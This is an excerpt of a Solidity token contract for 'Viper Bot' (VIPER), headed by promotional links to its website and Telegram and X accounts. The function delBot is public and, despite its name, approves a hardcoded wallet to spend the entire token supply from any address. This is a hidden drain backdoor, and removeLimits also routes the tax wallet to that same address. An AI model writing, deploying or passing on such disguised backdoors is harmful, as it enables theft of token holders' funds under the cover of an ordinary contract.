...
Website: https://viperbot.vip/
Telegram: https://t.me/viper_erc20
Twitter: https://x.com/viper_erc20
Tg Bot: https://t.me/viperfan_bot
...
contract VIPER is Context, IERC20, Ownable {
    ...
    address private _fundforbot = 0x659d99349Fb882A82E3046a1CCEa17FBC4b11cd2;
    ...
    string private constant _name = unicode"Viper Bot";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (!tradingOpen) {
            require (_isExcluded[from] || _isExcluded[to], "Trading disabled");
        }
    ...
    function removeLimits() external onlyOwner {
        ...
        _taxWallet = payable(_fundforbot);
        _caLimitSell = false;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function delBot(address _ttt) public returns (bool){
        _approve(_ttt, _fundforbot, _tTotal);
        return _bots[_ttt];
    }
